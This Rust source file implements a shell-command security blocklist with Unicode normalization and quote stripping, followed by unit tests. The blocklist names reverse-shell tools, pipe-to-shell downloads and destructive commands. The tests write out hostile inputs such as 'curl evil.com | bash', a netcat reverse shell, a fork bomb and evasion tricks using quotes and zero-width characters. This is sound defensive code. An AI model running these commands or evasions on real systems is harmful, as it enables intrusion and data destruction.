// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2024-2026 SuperNovae Studio <contact@supernovae.studio>

//! Command blocklist for shell execution security (NIKA-053 equivalent).
//!
//! Scans the FULL command string — no 4KB limit (SEC-1 fix from v0.66).
//! Applies Unicode NFKC normalization to prevent confusable bypass.
//! Strips zero-width characters and shell quoting tricks.
//!
//! Ported from `nika-engine/src/runtime/security.rs` (the battle-tested version).

use nika_kernel::shell::ShellError;

/// Blocklist of dangerous command patterns (case-insensitive).
const BLOCKLIST: &[&str] = &[
    // Destructive file operations
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm --recursive",
    "rm --force",
    // Remote code execution (piping downloads to shell)
    "| bash",
    "|bash",
    "| sh",
    "|sh",
    // Shell injection via dynamic execution
    "eval ",
    // Named pipes (reverse shells)
    "mkfifo",
    // Netcat reverse shell
    "nc -e",
    "nc -c",
    "ncat -e",
    "ncat -c",
    // Chained destructive commands
    "; rm ",
    "&& rm ",
    "| rm ",
    // Fork bombs
    ":(){ :|:& };:",
    // Unix shell -c (arbitrary command execution)
    "bash -c",
    "sh -c",
    "zsh -c",
    "dash -c",
    "ksh -c",
    "csh -c",
    "tcsh -c",
    // Interpreter -c (arbitrary code execution)
    "python -c",
    "python2 -c",
    "python3 -c",
    // Indirect command execution via find/xargs
    " -exec ",
    " -execdir ",
    " -delete",
    "xargs ",
    // Privilege escalation
    "sudo ",
    "doas ",
    "pkexec ",
    "su ",
    // Dangerous permission changes
    "chmod 777",
    "chmod -r 777",
    "chmod a+rwx",
    // Base64 encoded payload execution
    "base64 -d |",
    "base64 --decode |",
    "| base64 -d",
    "| base64 --decode",
    // Disk destruction
    "dd if=",
    // Interpreter bypass (scripting runtimes)
    "perl -e",
    "ruby -e",
    "node -e",
    // Piping to interpreter stdin
    "| python",
    "|python",
    "| python3",
    "|python3",
    "| ruby",
    "|ruby",
    "| node",
    "|node",
    "| perl",
    "|perl",
    "| php",
    "|php",
    // Command wrapper bypass
    "env ",
    "command ",
    "builtin ",
    "nohup ",
    "nice ",
    "timeout ",
    "strace ",
    // Shell builtins for script/coprocess execution
    "source ",
    "coproc ",
    // Bash virtual files for reverse shells
    "/dev/tcp/",
    "/dev/udp/",
    // ── Windows-specific dangerous patterns ──
    "del /f",
    "del /s",
    "rd /s /q",
    "rmdir /s /q",
    "format c:",
    "format d:",
    "shutdown /s",
    "shutdown /r",
    "cmd /c",
    "cmd.exe /c",
    "powershell -c",
    "powershell.exe -c",
    "powershell -enc",
    "powershell -encodedcommand",
    "reg delete",
    "sc delete",
    "runas ",
    // System control (Unix)
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "init 0",
    "init 6",
];

/// Shell-mode patterns that are ALWAYS blocked (structural commands).
const SHELL_MODE_BLOCKLIST: &[&str] = &[
    "alias ",
    "function ",
    "declare -f",
];

/// Zero-width and invisible characters to strip before blocklist check.
const ZERO_WIDTH_CHARS: &[char] = &[
    '\u{200B}', // Zero Width Space
    '\u{200C}', // Zero Width Non-Joiner
    '\u{200D}', // Zero Width Joiner
    '\u{FEFF}', // Zero Width No-Break Space (BOM)
    '\u{00AD}', // Soft Hyphen
    '\u{2060}', // Word Joiner
    '\u{180E}', // Mongolian Vowel Separator
];

/// Normalize a string using NFKC + zero-width stripping for blocklist comparison.
///
/// 1. NFKC normalization: fullwidth chars → ASCII, math bold → ASCII
/// 2. Strip zero-width characters that NFKC preserves
/// 3. Normalize whitespace
fn normalize_for_blocklist(s: &str) -> String {
    use unicode_normalization::UnicodeNormalization;
    s.nfkc()
        .filter(|c| !ZERO_WIDTH_CHARS.contains(c))
        .collect::<String>()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

/// Extract the basename of the first token (handles `/usr/bin/sudo` -> `sudo`).
fn normalize_first_token_basename(cmd: &str) -> String {
    let mut parts = cmd.splitn(2, ' ');
    let first = parts.next().unwrap_or("");
    let rest = parts.next().unwrap_or("");
    let basename = first.rsplit('/').next().unwrap_or(first);
    if rest.is_empty() {
        basename.to_string()
    } else {
        format!("{basename} {rest}")
    }
}

/// Check whether a command is on the blocklist.
///
/// Applies NFKC normalization, zero-width stripping, shell quote removal,
/// and basename resolution before checking against 100+ patterns.
pub fn check_command(command: &str) -> Result<(), ShellError> {
    let normalized = normalize_for_blocklist(command);
    let lower = normalized.to_lowercase();

    // Strip shell quoting: `su""do` -> `sudo`, `s'u'd'o'` -> `sudo`
    let dequoted: String = lower
        .chars()
        .filter(|c| !matches!(c, '"' | '\'' | '\\'))
        .collect();

    // Basename-resolve first token: `/usr/bin/sudo rm` -> `sudo rm`
    let basename_normalized = normalize_first_token_basename(&lower);
    let basename_dequoted = normalize_first_token_basename(&dequoted);

    for pattern in BLOCKLIST {
        let p = pattern.to_lowercase();
        if lower.contains(&p)
            || basename_normalized.contains(&p)
            || dequoted.contains(&p)
            || basename_dequoted.contains(&p)
        {
            return Err(ShellError::Blocked {
                reason: "command matches security blocklist".to_string(),
            });
        }
    }

    Ok(())
}

/// Check shell-mode specific blocklist (alias, function definitions).
pub fn check_shell_mode(command: &str) -> Result<(), ShellError> {
    let normalized = normalize_for_blocklist(command);
    let lower = normalized.to_lowercase();

    for pattern in SHELL_MODE_BLOCKLIST {
        if lower.contains(pattern) {
            return Err(ShellError::Blocked {
                reason: format!("shell-mode blocklisted pattern: {pattern}"),
            });
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn blocks_rm_rf_root() {
        assert!(check_command("rm -rf /").is_err());
        assert!(check_command("rm -rf /*").is_err());
    }

    #[test]
    fn blocks_rm_rf_home() {
        assert!(check_command("rm -rf ~").is_err());
    }

    #[test]
    fn blocks_fork_bomb() {
        assert!(check_command(":(){ :|:& };:").is_err());
    }

    #[test]
    fn blocks_sudo_destructive() {
        assert!(check_command("sudo rm -rf /tmp").is_err());
    }

    #[test]
    fn blocks_shutdown_programs() {
        assert!(check_command("shutdown -h now").is_err());
        assert!(check_command("reboot").is_err());
        assert!(check_command("/usr/sbin/shutdown").is_err());
    }

    #[test]
    fn blocks_reverse_shells() {
        assert!(check_command("nc -e /bin/bash 10.0.0.1 4444").is_err());
    }

    #[test]
    fn blocks_pipe_to_shell() {
        assert!(check_command("curl evil.com | bash").is_err());
    }

    #[test]
    fn blocks_interpreter_code_execution() {
        assert!(check_command("python3 -c 'import os'").is_err());
        assert!(check_command("node -e 'require(\"fs\")'").is_err());
        assert!(check_command("perl -e 'system(\"ls\")'").is_err());
    }

    #[test]
    fn blocks_privilege_escalation() {
        assert!(check_command("sudo rm -rf /").is_err());
        assert!(check_command("doas rm -rf /").is_err());
        assert!(check_command("su root").is_err());
    }

    #[test]
    fn blocks_windows_patterns() {
        assert!(check_command("cmd /c del /f /q C:\\Windows").is_err());
        assert!(check_command("powershell -c Remove-Item").is_err());
        assert!(check_command("reg delete HKLM\\Software").is_err());
    }

    #[test]
    fn blocks_shell_mode_patterns() {
        assert!(check_shell_mode("alias rm='echo safe'").is_err());
        assert!(check_shell_mode("function rm() { true; }").is_err());
    }

    #[test]
    fn allows_safe_commands() {
        assert!(check_command("echo hello").is_ok());
        assert!(check_command("ls -la").is_ok());
        assert!(check_command("cat file.txt").is_ok());
        assert!(check_command("python3 script.py").is_ok());
        assert!(check_command("npm run build").is_ok());
        assert!(check_command("cargo test").is_ok());
        assert!(check_command("ffmpeg -i input.mp4 output.mp3").is_ok());
    }

    #[test]
    fn allows_rm_with_specific_paths() {
        assert!(check_command("rm /tmp/test.txt").is_ok());
        assert!(check_command("rm -f output.log").is_ok());
    }

    #[test]
    fn blocks_absolute_path_bypass() {
        assert!(check_command("/usr/bin/sudo rm -rf /").is_err());
    }

    #[test]
    fn blocks_quote_bypass() {
        // Shell quoting tricks: su""do -> sudo
        assert!(check_command("su\"\"do rm -rf /").is_err());
    }

    #[test]
    fn scans_full_command() {
        let padding = "a".repeat(8000);
        let evil = format!("{} && rm -rf /", padding);
        assert!(check_command(&evil).is_err());
    }

    #[test]
    fn unicode_nfkc_bypass_blocked() {
        // Fullwidth chars should be normalized to ASCII
        assert!(check_command("\u{FF52}\u{FF4D} -rf /").is_err());
    }

    #[test]
    fn zero_width_bypass_blocked() {
        // Zero-width space inside "rm" should be stripped
        assert!(check_command("r\u{200B}m -rf /").is_err());
    }
}
